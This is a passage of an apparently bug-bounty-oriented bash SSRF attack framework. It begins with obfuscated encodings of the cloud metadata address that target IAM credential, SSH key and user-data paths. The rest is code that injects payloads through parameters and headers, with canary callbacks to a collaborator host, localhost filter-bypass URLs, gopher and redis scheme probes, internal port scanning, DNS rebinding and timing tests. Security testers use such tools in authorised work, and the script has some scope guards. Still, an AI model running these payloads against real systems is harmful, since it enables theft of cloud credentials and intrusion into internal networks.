169.0x0000000000000fe.169.0x000000fe/latest/user-data/iam/security-credentials/admin
169.0x0000000000000fe.169.0x000000fe/latest/meta-data/
169.0x0000000000000fe.169.0x000000fe/latest/meta-data/iam/security-credentials/admin
169.0x0000000000000fe.169.0x000000fe/latest/meta-data/iam/security-credentials/PhotonInstance
169.0x0000000000000fe.169.0x000000fe/latest/meta-data/ami-id
169.0x0000000000000fe.169.0x000000fe/latest/meta-data/reservation-id
169.0x0000000000000fe.169.0x000000fe/latest/meta-data/hostname
169.0x0000000000000fe.169.0x000000fe/latest/meta-data/public-keys/
169.0x0000000000000fe.169.0x000000fe/latest/meta-data/public-keys/0/openssh-key
169.0x0000000000000fe.169.0x000000fe/latest/meta-data/public-keys/[ID]/openssh-key
169.0x0000000000000fe.169.0x000000fe/latest/meta-data/iam/security-credentials/dummy
169.0x0000000000000fe.169.0x000000fe/latest/meta-data/iam/security-credentials/s3access
169.0x0000000000000fe.169.0x000000fe/latest/dynamic/instance-identity/document
169.0x0000000000000fe.169.0x000000fe/metadata/v1/maintenance
169.0x0000000000000fe.169.0x000000fe/latest/dynamic/instance-identity/document
169.0x0000000000000fe.169.0x000000fe/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
169.0x0000000000000fe.169.0x000000fe/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
169.0x0000000000000fe.169.0x000000fe/computeMetadata/v1/
0x00000000000a9.0x000000fe.0x0000000000000a9.254/latest/user-data
0x00000000000a9.0x000000fe.0x0000000000000a9.254/latest/user-data/iam/security-credentials/admin
0x00000000000a9.0x000000fe.0x0000000000000a9.254/latest/meta-data/
0x00000000000a9.0x000000fe.0x0000000000000a9.254/latest/meta-data/iam/security-credentials/admin
0x00000000000a9.0x000000fe.0x0000000000000a9.254/latest/meta-data/iam/security-credentials/PhotonInstance
0x00000000000a9.0x000000fe.0x0000000000000a9.254/latest/meta-data/ami-id
0x00000000000a9.0x000000fe.0x0000000000000a9.254/latest/meta-data/reservation-id
0x00000000000a9.0x000000fe.0x0000000000000a9.254/latest/meta-data/hostname
0x00000000000a9.0x000000fe.0x0000000000000a9.254/latest/meta-data/public-keys/
0x00000000000a9.0x000000fe.0x0000000000000a9.254/latest/meta-data/public-keys/0/openssh-key
0x00000000000a9.0x000000fe.0x0000000000000a9.254/latest/meta-data/public-keys/[ID]/openssh-key
0x00000000000a9.0x000000fe.0x0000000000000a9.254/latest/meta-data/iam/security-credentials/dummy
0x00000000000a9.0x000000fe.0x0000000000000a9.254/latest/meta-data/iam/security-credentials/s3access
0x00000000000a9.0x000000fe.0x0000000000000a9.254/latest/dynamic/instance-identity/document
0x00000000000a9.0x000000fe.0x0000000000000a9.254/metadata/v1/maintenance
0x00000000000a9.0x000000fe.0x0000000000000a9.254/latest/dynamic/instance-identity/document
0x00000000000a9.0x000000fe.0x0000000000000a9.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
0x00000000000a9.0x000000fe.0x0000000000000a9.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
0x00000000000a9.0x000000fe.0x0000000000000a9.254/computeMetadata/v1/
00000000000000251.000000376.0x000000000000000000000000000a9.254/latest/user-data
00000000000000251.000000376.0x000000000000000000000000000a9.254/latest/user-data/iam/security-credentials/admin
00000000000000251.000000376.0x000000000000000000000000000a9.254/latest/meta-data/
00000000000000251.000000376.0x000000000000000000000000000a9.254/latest/meta-data/iam/security-credentials/admin
00000000000000251.000000376.0x000000000000000000000000000a9.254/latest/meta-data/iam/security-credentials/PhotonInstance
00000000000000251.000000376.0x000000000000000000000000000a9.254/latest/meta-data/ami-id
00000000000000251.000000376.0x000000000000000000000000000a9.254/latest/meta-data/reservation-id
00000000000000251.000000376.0x000000000000000000000000000a9.254/latest/meta-data/hostname
00000000000000251.000000376.0x000000000000000000000000000a9.254/latest/meta-data/public-keys/
00000000000000251.000000376.0x000000000000000000000000000a9.254/latest/meta-data/public-keys/0/openssh-key
00000000000000251.000000376.0x000000000000000000000000000a9.254/latest/meta-data/public-keys/[ID]/openssh-key
00000000000000251.000000376.0x000000000000000000000000000a9.254/latest/meta-data/iam/security-credentials/dummy
00000000000000251.000000376.0x000000000000000000000000000a9.254/latest/meta-data/iam/security-credentials/s3access
00000000000000251.000000376.0x000000000000000000000000000a9.254/latest/dynamic/instance-identity/document
00000000000000251.000000376.0x000000000000000000000000000a9.254/metadata/v1/maintenance
00000000000000251.000000376.0x000000000000000000000000000a9.254/latest/dynamic/instance-identity/document
00000000000000251.000000376.0x000000000000000000000000000a9.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
00000000000000251.000000376.0x000000000000000000000000000a9.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
00000000000000251.000000376.0x000000000000000000000000000a9.254/computeMetadata/v1/
000251.254.169.0x0000000000000000000000fe/latest/user-data
000251.254.169.0x0000000000000000000000fe/latest/user-data/iam/security-credentials/admin
000251.254.169.0x0000000000000000000000fe/latest/meta-data/
000251.254.169.0x0000000000000000000000fe/latest/meta-data/iam/security-credentials/admin
000251.254.169.0x0000000000000000000000fe/latest/meta-data/iam/security-credentials/PhotonInstance
000251.254.169.0x0000000000000000000000fe/latest/meta-data/ami-id
000251.254.169.0x0000000000000000000000fe/latest/meta-data/reservation-id
000251.254.169.0x0000000000000000000000fe/latest/meta-data/hostname
000251.254.169.0x0000000000000000000000fe/latest/meta-data/public-keys/
000251.254.169.0x0000000000000000000000fe/latest/meta-data/public-keys/0/openssh-key
000251.254.169.0x0000000000000000000000fe/latest/meta-data/public-keys/[ID]/openssh-key
000251.254.169.0x0000000000000000000000fe/latest/meta-data/iam/security-credentials/dummy
000251.254.169.0x0000000000000000000000fe/latest/meta-data/iam/security-credentials/s3access
000251.254.169.0x0000000000000000000000fe/latest/dynamic/instance-identity/document
000251.254.169.0x0000000000000000000000fe/metadata/v1/maintenance
000251.254.169.0x0000000000000000000000fe/latest/dynamic/instance-identity/document
000251.254.169.0x0000000000000000000000fe/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
000251.254.169.0x0000000000000000000000fe/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
000251.254.169.0x0000000000000000000000fe/computeMetadata/v1/
00000251.0x0000000000000000000000000000fe.00000000251.254/latest/user-data
00000251.0x0000000000000000000000000000fe.00000000251.254/latest/user-data/iam/security-credentials/admin
00000251.0x0000000000000000000000000000fe.00000000251.254/latest/meta-data/
00000251.0x0000000000000000000000000000fe.00000000251.254/latest/meta-data/iam/security-credentials/admin
00000251.0x0000000000000000000000000000fe.00000000251.254/latest/meta-data/iam/security-credentials/PhotonInstance
00000251.0x0000000000000000000000000000fe.00000000251.254/latest/meta-data/ami-id
00000251.0x0000000000000000000000000000fe.00000000251.254/latest/meta-data/reservation-id
00000251.0x0000000000000000000000000000fe.00000000251.254/latest/meta-data/hostname
00000251.0x0000000000000000000000000000fe.00000000251.254/latest/meta-data/public-keys/
00000251.0x0000000000000000000000000000fe.00000000251.254/latest/meta-data/public-keys/0/openssh-key
00000251.0x0000000000000000000000000000fe.00000000251.254/latest/meta-data/public-keys/[ID]/openssh-key
00000251.0x0000000000000000000000000000fe.00000000251.254/latest/meta-data/iam/security-credentials/dummy
00000251.0x0000000000000000000000000000fe.00000000251.254/latest/meta-data/iam/security-credentials/s3access
00000251.0x0000000000000000000000000000fe.00000000251.254/latest/dynamic/instance-identity/document
00000251.0x0000000000000000000000000000fe.00000000251.254/metadata/v1/maintenance
00000251.0x0000000000000000000000000000fe.00000000251.254/latest/dynamic/instance-identity/document
00000251.0x0000000000000000000000000000fe.00000000251.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
00000251.0x0000000000000000000000000000fe.00000000251.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
00000251.0x0000000000000000000000000000fe.00000000251.254/computeMetadata/v1/
__SSRF_EMBEDDED_PAYLOADS__
}

################################
# Helpers
################################
need_cmd() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "Error: required command not found: $1" >&2
    exit 2
  }
}

need_cmd curl
need_cmd sha256sum
need_cmd awk
need_cmd sort

if command -v jq >/dev/null 2>&1; then
  HAVE_JQ=1
else
  HAVE_JQ=0
  echo "[!] jq not found: JSON POST tests will be skipped."
fi

sleep_request() {
  if awk "BEGIN {exit !($REQUEST_SLEEP > 0)}"; then
    sleep "$REQUEST_SLEEP"
  fi
}


sanitize_label() {
  local raw="$1"
  raw="${raw,,}"
  raw="$(printf '%s' "$raw" | tr -c 'a-z0-9-' '-' | sed -E 's/-+/-/g; s/^-//; s/-$//')"
  printf '%.38s' "$raw"
}

make_canary() {
  local descriptor="$1"
  local clean hash
  clean="$(sanitize_label "$descriptor")"
  hash="$(printf '%s-%s-%s' "$descriptor" "$(date +%s%N)" "$RANDOM" | sha256sum | cut -c1-10)"
  printf '%s-%s.%s' "${clean:-probe}" "$hash" "$COLLABORATOR"
}

json_body() {
  local key="$1" value="$2"
  jq -nc --arg k "$key" --arg v "$value" '{($k): $v}'
}

header_value_for_host() {
  local header="$1" host="$2"
  if [[ "${header,,}" == "forwarded" ]]; then
    printf 'host=%s' "$host"
  else
    printf '%s' "$host"
  fi
}

log_request() {
  local target="$1" mode="$2" vector="$3" name="$4" payload="$5" meta="$6" location="$7"
  local code size total
  IFS=$'\t' read -r code size total <<< "$meta"
  location="${location//$'\t'/ }"
  location="${location//$'\r'/}"
  location="${location//$'\n'/ }"
  payload="${payload//$'\t'/ }"
  printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
    "$(date -Iseconds)" "$target" "$mode" "$vector" "$name" "$payload" \
    "${code:-000}" "${size:-0}" "${total:-0}" "$location" >> "$REQUEST_LOG"
}

# Run curl without following redirects, capture status/size/time and Location header.
run_curl_logged() {
  local target="$1" mode="$2" vector="$3" name="$4" payload="$5"
  shift 5
  local hdr meta rc location
  hdr="$(mktemp)"

  set +e
  meta="$(curl "${CURL_COMMON[@]}" -D "$hdr" -o /dev/null \
    -w $'%{http_code}\t%{size_download}\t%{time_total}' "$@")"
  rc=$?
  set -e

  location="$(awk 'BEGIN{IGNORECASE=1} /^Location:/ {sub(/^[^:]+:[[:space:]]*/, ""); gsub(/\r/, ""); print; exit}' "$hdr")"
  rm -f "$hdr"

  log_request "$target" "$mode" "$vector" "$name" "$payload" "$meta" "$location"

  if [[ $rc -ne 0 ]]; then
    echo "[curl-error:$rc] $vector $name -> $payload" >&2
  fi

  sleep_request
}

# Build a GET URL while preserving unrelated existing query parameters.
# mode=replace: remove existing copies of param, then append payload once.
# mode=duplicate: keep the original query intact and append another copy.
build_get_url() {
  local target="$1" param="$2" payload="$3" qmode="$4"
  python3 - "$target" "$param" "$payload" "$qmode" <<'PYURL'
import sys
from urllib.parse import urlsplit, urlunsplit, quote_plus, unquote_plus

target, param, payload, mode = sys.argv[1:5]
u = urlsplit(target)
parts = []

if u.query:
    for piece in u.query.split('&'):
        if not piece:
            continue
        key = piece.split('=', 1)[0]
        if mode == 'replace' and unquote_plus(key) == param:
            continue
        parts.append(piece)

parts.append(quote_plus(param, safe='') + '=' + quote_plus(payload, safe=''))
query = '&'.join(parts)

# Fragments are client-side only and are not part of the HTTP request.
print(urlunsplit((u.scheme, u.netloc, u.path, query, '')))
PYURL
}

target_has_query_param() {
  local target="$1" param="$2"
  python3 - "$target" "$param" <<'PYHAS'
import sys
from urllib.parse import urlsplit, unquote_plus

target, param = sys.argv[1:3]
for piece in urlsplit(target).query.split('&'):
    if piece and unquote_plus(piece.split('=', 1)[0]) == param:
        raise SystemExit(0)
raise SystemExit(1)
PYHAS
}

request_get_param_variant() {
  local target="$1" param="$2" payload="$3" mode="$4" qmode="$5"
  local url
  url="$(build_get_url "$target" "$param" "$payload" "$qmode")"
  run_curl_logged "$target" "$mode" "GET-param-$qmode" "$param" "$payload" "$url"
}

request_get_param() {
  local target="$1" param="$2" payload="$3" mode="$4"
  case "$QUERY_MODE" in
    replace)
      request_get_param_variant "$target" "$param" "$payload" "$mode" "replace"
      ;;
    duplicate)
      request_get_param_variant "$target" "$param" "$payload" "$mode" "duplicate"
      ;;
    both)
      request_get_param_variant "$target" "$param" "$payload" "$mode" "replace"
      # If the target does not already contain this parameter, duplicate and
      # replace would be the same request, so avoid sending it twice.
      if target_has_query_param "$target" "$param"; then
        request_get_param_variant "$target" "$param" "$payload" "$mode" "duplicate"
      fi
      ;;
  esac
}

request_post_form() {
  local target="$1" param="$2" payload="$3" mode="$4"
  run_curl_logged "$target" "$mode" "POST-form" "$param" "$payload" \
    -X POST --data-urlencode "$param=$payload" "$target"
}

request_post_json() {
  local target="$1" param="$2" payload="$3" mode="$4"
  [[ "$HAVE_JQ" -eq 1 ]] || return 0
  local body
  body="$(json_body "$param" "$payload")"
  run_curl_logged "$target" "$mode" "POST-json" "$param" "$payload" \
    -X POST -H 'Content-Type: application/json' --data "$body" "$target"
}

request_header() {
  local target="$1" header="$2" payload="$3" mode="$4"
  run_curl_logged "$target" "$mode" "header" "$header" "$payload" \
    -H "$header: $payload" "$target"
}

request_all_param_methods() {
  local target="$1" param="$2" payload="$3" mode="$4"
  request_get_param "$target" "$param" "$payload" "$mode"
  request_post_form "$target" "$param" "$payload" "$mode"
  request_post_json "$target" "$param" "$payload" "$mode"
}

selected_params() {
  if [[ -n "$ACTIVE_PARAM" ]]; then
    printf '%s\n' "$ACTIVE_PARAM"
  else
    printf '%s\n' "${PARAMS[@]}"
  fi
}

selected_url_headers() {
  if [[ -n "$ACTIVE_HEADER" ]]; then
    printf '%s\n' "$ACTIVE_HEADER"
  else
    printf '%s\n' "${URL_HEADERS[@]}"
  fi
}

################################
# Embedded payload-library helpers
################################
payload_is_sensitive() {
  local raw="${1,,}"
  [[ "$raw" == *"iam/security-credentials"* ||
     "$raw" == *"service-accounts/default/token"* ||
     "$raw" == *"public-keys"* ||
     "$raw" == *"user-data"* ||
     "$raw" == *"kube-env"* ||
     "$raw" == *"openssh-key"* ]]
}

payload_schemes_for() {
  local raw="$1" item
  if [[ "$PAYLOAD_SCHEMES" == "auto" ]]; then
    printf '%s\n' http https
    # Filesystem-looking entries from the supplied list get a file:// variant as well.
    if [[ "$raw" == /* || "$raw" == *"etc/passwd"* || "$raw" == \\/\\/* ]]; then
      printf '%s\n' file
    fi
    return
  fi

  IFS=',' read -r -a _schemes <<< "$PAYLOAD_SCHEMES"
  for item in "${_schemes[@]}"; do
    item="${item//[[:space:]]/}"
    [[ -n "$item" ]] && printf '%s\n' "${item%://}"
  done
}

compose_payload_url() {
  local scheme="$1" raw="$2"

  # If a future custom list already contains a scheme, preserve it exactly.
  if [[ "$raw" =~ ^[A-Za-z][A-Za-z0-9+.-]*:// ]]; then
    printf '%s' "$raw"
    return
  fi

  case "$scheme" in
    file)
      # file:// + /etc/passwd naturally becomes file:///etc/passwd.
      printf 'file://%s' "$raw"
      ;;
    *)
      printf '%s://%s' "$scheme" "$raw"
      ;;
  esac
}

validate_payload_scope() {
  if [[ -z "$ACTIVE_PARAM" && -z "$ACTIVE_HEADER" && "$FORCE_BROAD_PAYLOADS" != "1" ]]; then
    echo "Error: payloads mode requires ACTIVE_PARAM or ACTIVE_HEADER." >&2
    echo "Example: ACTIVE_PARAM=url ./ssrf-framework.sh payloads" >&2
    echo "Set FORCE_BROAD_PAYLOADS=1 only if you intentionally want the full library sprayed across all configured inputs." >&2
    return 1
  fi
}

run_payloads() {
  local target="$1" raw scheme payload param header sent=0
  validate_payload_scope || return 1
  echo "[+] Embedded payload library: $target"
  echo "[*] Payload level: $PAYLOAD_LEVEL | Schemes: $PAYLOAD_SCHEMES | Limit: ${PAYLOAD_LIMIT:-0}"

  while IFS= read -r raw || [[ -n "$raw" ]]; do
    raw="${raw%$'\r'}"
    [[ -z "${raw//[[:space:]]/}" ]] && continue
    [[ "${raw:0:1}" == "#" ]] && continue

    if [[ "$PAYLOAD_LEVEL" == "safe" ]] && payload_is_sensitive "$raw"; then
      continue
    fi

    while IFS= read -r scheme; do
      payload="$(compose_payload_url "$scheme" "$raw")"

      if [[ -n "$ACTIVE_PARAM" || "$FORCE_BROAD_PAYLOADS" == "1" ]]; then
        while IFS= read -r param; do
          request_all_param_methods "$target" "$param" "$payload" "payloads"
        done < <(selected_params)
      fi

      if [[ -n "$ACTIVE_HEADER" || "$FORCE_BROAD_PAYLOADS" == "1" ]]; then
        while IFS= read -r header; do
          request_header "$target" "$header" "$payload" "payloads"
        done < <(selected_url_headers)
      fi

      sent=$((sent + 1))
      if [[ "$PAYLOAD_LIMIT" -gt 0 && "$sent" -ge "$PAYLOAD_LIMIT" ]]; then
        echo "[*] PAYLOAD_LIMIT=$PAYLOAD_LIMIT reached."
        return 0
      fi
    done < <(payload_schemes_for "$raw")
  done < <(embedded_payloads)
}

################################
# Baseline logging
################################
baseline_target() {
  local target="$1"
  run_curl_logged "$target" "baseline" "direct" "-" "$target" "$target"
}

################################
# Discovery
################################
discovery_payload() {
  local scheme="$1" canary="$2"
  case "$scheme" in
    http)   printf 'http://%s/ssrf' "$canary" ;;
    https)  printf 'https://%s/ssrf' "$canary" ;;
    ftp)    printf 'ftp://%s:21/ssrf-probe' "$canary" ;;
    ldap)   printf 'ldap://%s:389/' "$canary" ;;
    dict)   printf 'dict://%s:2628/ssrf-probe' "$canary" ;;
    gopher) printf 'gopher://%s:70/_ssrf-probe' "$canary" ;;
    redis)  printf 'redis://%s:6379/' "$canary" ;;
    smtp)   printf 'smtp://%s:25/' "$canary" ;;
    smtps)  printf 'smtps://%s:465/' "$canary" ;;
    *)      printf '%s://%s/ssrf' "$scheme" "$canary" ;;
  esac
}

run_discover() {
  local target="$1" param scheme canary header value payload
  echo "[+] Discovery: $target"
  echo "[*] Discovery schemes: ${DISCOVERY_SCHEMES_CSV}"

  while IFS= read -r param; do
    for scheme in "${DISCOVERY_SCHEMES[@]}"; do
      scheme="${scheme//[[:space:]]/}"
      [[ -n "$scheme" ]] || continue

      canary="$(make_canary "get-${param}-${scheme}")"
      payload="$(discovery_payload "$scheme" "$canary")"
      request_get_param "$target" "$param" "$payload" "discover"

      canary="$(make_canary "form-${param}-${scheme}")"
      payload="$(discovery_payload "$scheme" "$canary")"
      request_post_form "$target" "$param" "$payload" "discover"

      if [[ "$HAVE_JQ" -eq 1 ]]; then
        canary="$(make_canary "json-${param}-${scheme}")"
        payload="$(discovery_payload "$scheme" "$canary")"
        request_post_json "$target" "$param" "$payload" "discover"
      fi
    done
  done < <(selected_params)

  while IFS= read -r header; do
    for scheme in "${DISCOVERY_SCHEMES[@]}"; do
      scheme="${scheme//[[:space:]]/}"
      [[ -n "$scheme" ]] || continue
      canary="$(make_canary "hdr-${header}-${scheme}")"
      payload="$(discovery_payload "$scheme" "$canary")"
      request_header "$target" "$header" "$payload" "discover"
    done
  done < <(selected_url_headers)

  for header in "${HOST_HEADERS[@]}"; do
    canary="$(make_canary "host-${header}")"
    value="$(header_value_for_host "$header" "$canary")"
    request_header "$target" "$header" "$value" "discover"
  done
}

################################
# URL parser/filter bypasses
################################
run_bypass() {
  local target="$1" param header canary payload idx
  echo "[+] Parser/filter bypass tests: $target"

  while IFS= read -r param; do
    idx=0
    for template in \
      'http://127.0.0.1@CANARY/' \
      'http://CANARY#127.0.0.1/' \
      'http://127.0.0.1%09@CANARY/' \
      'http://127.0.0.1%00@CANARY/' \
      'http://localhost.CANARY/' \
      'http://127.0.0.1.CANARY/' \
      'http://CANARY%23@127.0.0.1/'; do
      idx=$((idx + 1))
      canary="$(make_canary "bypass-${param}-${idx}")"
      payload="${template//CANARY/$canary}"
      request_all_param_methods "$target" "$param" "$payload" "bypass"
    done

    # Local-only parser representations: useful through response/timing differences.
    for payload in \
      'http://127.1/' \
      'http://2130706433/' \
      'http://0x7f000001/' \
      'http://017700000001/' \
      'http://[::ffff:127.0.0.1]/' \
      'http://[::1]/'; do
      request_all_param_methods "$target" "$param" "$payload" "bypass"
    done
  done < <(selected_params)

  while IFS= read -r header; do
    idx=0
    for template in \
      'http://127.0.0.1@CANARY/' \
      'http://CANARY#127.0.0.1/' \
      'http://localhost.CANARY/'; do
      idx=$((idx + 1))
      canary="$(make_canary "bypass-hdr-${header}-${idx}")"
      payload="${template//CANARY/$canary}"
      request_header "$target" "$header" "$payload" "bypass"
    done
  done < <(selected_url_headers)
}

################################
# Protocol capability checks
################################
run_protocols() {
  local target="$1" param proto canary payload
  echo "[+] Protocol capability checks: $target"

  while IFS= read -r param; do
    for proto in "${PROTOCOL_SCHEMES[@]}"; do
      canary="$(make_canary "proto-${param}-${proto}")"
      payload="$(discovery_payload "$proto" "$canary")"
      request_all_param_methods "$target" "$param" "$payload" "protocols"
    done
  done < <(selected_params)

  echo "[*] file:// is intentionally not automated; validate manually only when program rules allow it."
}

################################
# Internal reachability
################################
validate_internal_scope() {
  if [[ -z "$ACTIVE_PARAM" && -z "$ACTIVE_HEADER" && "$FORCE_BROAD_INTERNAL" != "1" ]]; then
    echo "Error: internal mode requires ACTIVE_PARAM or ACTIVE_HEADER." >&2
    echo "Example: ACTIVE_PARAM=url ./ssrf-framework.sh internal" >&2
    echo "Set FORCE_BROAD_INTERNAL=1 only if you intentionally want broad internal probing." >&2
    return 1
  fi
}

run_internal() {
  local target="$1" param header host port payload metadata
  validate_internal_scope || return 1
  echo "[+] Internal reachability: $target"

  if [[ -n "$ACTIVE_PARAM" || "$FORCE_BROAD_INTERNAL" == "1" ]]; then
    while IFS= read -r param; do
      for host in "${INTERNAL_HOSTS[@]}"; do
        for port in "${PORTS[@]}"; do
          payload="http://${host}:${port}/"
          request_all_param_methods "$target" "$param" "$payload" "internal"
        done
      done

      for metadata in "${SAFE_METADATA_URLS[@]}"; do
        request_all_param_methods "$target" "$param" "$metadata" "internal-metadata"
      done
    done < <(selected_params)
  fi

  if [[ -n "$ACTIVE_HEADER" || "$FORCE_BROAD_INTERNAL" == "1" ]]; then
    while IFS= read -r header; do
      for host in "${INTERNAL_HOSTS[@]}"; do
        for port in "${PORTS[@]}"; do
          payload="http://${host}:${port}/"
          request_header "$target" "$header" "$payload" "internal"
        done
      done

      for metadata in "${SAFE_METADATA_URLS[@]}"; do
        request_header "$target" "$header" "$metadata" "internal-metadata"
      done
    done < <(selected_url_headers)
  fi
}

################################
# DNS rebinding request stage
################################
run_rebind() {
  local target="$1" param header payload

  if [[ -z "$REBIND_DOMAIN" ]]; then
    echo "Error: REBIND_DOMAIN is empty." >&2
    echo "Configure a DNS name served by your rebinding DNS server; an OAST hostname alone is not rebinding." >&2
    return 1
  fi

  if [[ -z "$ACTIVE_PARAM" && -z "$ACTIVE_HEADER" ]]; then
    echo "Error: rebind mode requires ACTIVE_PARAM or ACTIVE_HEADER to avoid broad spraying." >&2
    return 1
  fi

  echo "[+] Rebinding request stage: $target"
  for payload in \
    "http://${REBIND_DOMAIN}/" \
    "https://${REBIND_DOMAIN}/" \
    "http://${REBIND_DOMAIN}:80/" \
    "http://${REBIND_DOMAIN}:8080/"; do

    if [[ -n "$ACTIVE_PARAM" ]]; then
      request_all_param_methods "$target" "$ACTIVE_PARAM" "$payload" "rebind"
    fi
    if [[ -n "$ACTIVE_HEADER" ]]; then
      request_header "$target" "$ACTIVE_HEADER" "$payload" "rebind"
    fi
  done
}

################################
# Timing comparison
################################
median() {
  local values=("$@") count mid
  count="${#values[@]}"
  printf '%s\n' "${values[@]}" | sort -n | awk -v n="$count" '
    {a[NR]=$1}
    END {
      if (n == 0) { print "0"; exit }
      if (n % 2 == 1) { print a[(n+1)/2] }
      else { print (a[n/2] + a[n/2+1]) / 2 }
    }'
}

time_get_param_once_mode() {
  local target="$1" param="$2" payload="$3" qmode="$4"
  local url
  url="$(build_get_url "$target" "$param" "$payload" "$qmode")"
  curl "${CURL_COMMON[@]}" -o /dev/null -w '%{time_total}' \
    "$url" 2>/dev/null || printf '%s' "$TIMEOUT"
}

time_get_param_once() {
  local target="$1" param="$2" payload="$3"
  # Timing needs one deterministic request shape per sample. When QUERY_MODE=both,
  # use replacement timing; run QUERY_MODE=duplicate separately if desired.
  local qmode="$QUERY_MODE"
  [[ "$qmode" == "both" ]] && qmode="replace"
  time_get_param_once_mode "$target" "$param" "$payload" "$qmode"
}

time_header_once() {
  local target="$1" header="$2" payload="$3"
  curl "${CURL_COMMON[@]}" -o /dev/null -w '%{time_total}' \
    -H "$header: $payload" "$target" 2>/dev/null || printf '%s' "$TIMEOUT"
}

run_timing_param() {
  local target="$1" param="$2" payload="$3"
  local -a base=() cand=()
  local i b c base_med cand_med delta suspicious

  for ((i=1; i<=TIMING_RUNS; i++)); do
    b="$(time_get_param_once "$target" "$param" "$TIMING_BASELINE_URL")"
    c="$(time_get_param_once "$target" "$param" "$payload")"
    base+=("$b")
    cand+=("$c")
    sleep_request
  done

  base_med="$(median "${base[@]}")"
  cand_med="$(median "${cand[@]}")"
  delta="$(awk -v c="$cand_med" -v b="$base_med" 'BEGIN{printf "%.3f", c-b}')"
  suspicious="$(awk -v d="$delta" -v t="$TIMING_DELTA" 'BEGIN{print (d>=t)?1:0}')"

  if [[ "$suspicious" == "1" ]]; then
    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
      "$(date -Iseconds)" "$target" "GET-param" "$param" "$payload" \
      "$base_med" "$cand_med" "$delta" | tee -a "$TIMING_LOG"
  fi
}

run_timing_header() {
  local target="$1" header="$2" payload="$3"
  local -a base=() cand=()
  local i b c base_med cand_med delta suspicious

  for ((i=1; i<=TIMING_RUNS; i++)); do
    b="$(time_header_once "$target" "$header" "$TIMING_BASELINE_URL")"
    c="$(time_header_once "$target" "$header" "$payload")"
    base+=("$b")
    cand+=("$c")
    sleep_request
  done

  base_med="$(median "${base[@]}")"
  cand_med="$(median "${cand[@]}")"
  delta="$(awk -v c="$cand_med" -v b="$base_med" 'BEGIN{printf "%.3f", c-b}')"
  suspicious="$(awk -v d="$delta" -v t="$TIMING_DELTA" 'BEGIN{print (d>=t)?1:0}')"

  if [[ "$suspicious" == "1" ]]; then
    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
      "$(date -Iseconds)" "$target" "header" "$header" "$payload" \
      "$base_med" "$cand_med" "$delta" | tee -a "$TIMING_LOG"
  fi
}

run_timing() {
  local target="$1" param header payload
  echo "[+] Timing comparison: $target"

  while IFS= read -r param; do
    for payload in "${TIME_PAYLOADS[@]}"; do
      run_timing_param "$target" "$param" "$payload"
    done
  done < <(selected_params)

  while IFS= read -r header; do
    for payload in "${TIME_PAYLOADS[@]}"; do
      run_timing_header "$target" "$header" "$payload"
    done
  done < <(selected_url_headers)
}

################################
# Main
################################
mapfile -t TARGETS < "$TARGETS_FILE"

if [[ "$COLLABORATOR" == "burpcollaborator.net" ]]; then
  echo "[!] COLLABORATOR is still the generic placeholder '$COLLABORATOR'."
  echo "[!] For useful OOB correlation, set it to the unique domain issued by Burp Collaborator/Interactsh/OAST."
fi

echo "=== SSRF Framework ==="
echo "Mode:        $MODE"
echo "Targets:     $TARGETS_FILE"
echo "Proxy:       ${PROXY:-disabled}"
echo "Logs:        $LOG_DIR"
echo "Timeout:     ${TIMEOUT}s"
echo "Req sleep:   ${REQUEST_SLEEP}s"
echo "Query mode:  ${QUERY_MODE}"
echo "Disc schemes: ${DISCOVERY_SCHEMES_CSV}"
echo "Payloads:    embedded 429-line library | level=${PAYLOAD_LEVEL} | schemes=${PAYLOAD_SCHEMES}"
echo

for TARGET in "${TARGETS[@]}"; do
  TARGET="${TARGET//$'\r'/}"
  [[ -z "${TARGET//[[:space:]]/}" ]] && continue
  [[ "${TARGET:0:1}" == "#" ]] && continue

  echo "============================================================"
  echo "Target: $TARGET"
  baseline_target "$TARGET"

  case "$MODE" in
    discover)
      run_discover "$TARGET"
      ;;
    bypass)
      run_bypass "$TARGET"
      ;;
    protocols)
      run_protocols "$TARGET"
      ;;
    internal)
      run_internal "$TARGET"
      ;;
    rebind)
      run_rebind "$TARGET"
      ;;
    timing)
      run_timing "$TARGET"
      ;;
    payloads)
      run_payloads "$TARGET"
      ;;
    all)
      run_discover "$TARGET"
      run_bypass "$TARGET"
      # discover already includes alternate schemes by default; use protocols
      # mode separately when you want a focused protocol-only re-test.
      run_timing "$TARGET"

      if [[ -n "$ACTIVE_PARAM" || -n "$ACTIVE_HEADER" || "$FORCE_BROAD_INTERNAL" == "1" ]]; then
        run_internal "$TARGET"
      else
        echo "[*] Skipping internal stage: set ACTIVE_PARAM/ACTIVE_HEADER first."
      fi

      if [[ -n "$ACTIVE_PARAM" || -n "$ACTIVE_HEADER" || "$FORCE_BROAD_PAYLOADS" == "1" ]]; then
        run_payloads "$TARGET"
      else
        echo "[*] Skipping embedded payload library: set ACTIVE_PARAM/ACTIVE_HEADER first."
      fi

      if [[ -n "$REBIND_DOMAIN" && ( -n "$ACTIVE_PARAM" || -n "$ACTIVE_HEADER" ) ]]; then
        run_rebind "$TARGET"
      else
        echo "[*] Skipping rebind stage: configure REBIND_DOMAIN + ACTIVE_PARAM/ACTIVE_HEADER."
      fi
      ;;
  esac

done

echo
echo "[+] Finished."
echo "[+] Request log: $REQUEST_LOG"
echo "[+] Timing hits: $TIMING_LOG"
echo "[+] Review your OAST/Collaborator logs and correlate the unique subdomain labels."
echo "[+] Full embedded payload mode: ACTIVE_PARAM=url ./ssrf-framework.sh payloads"
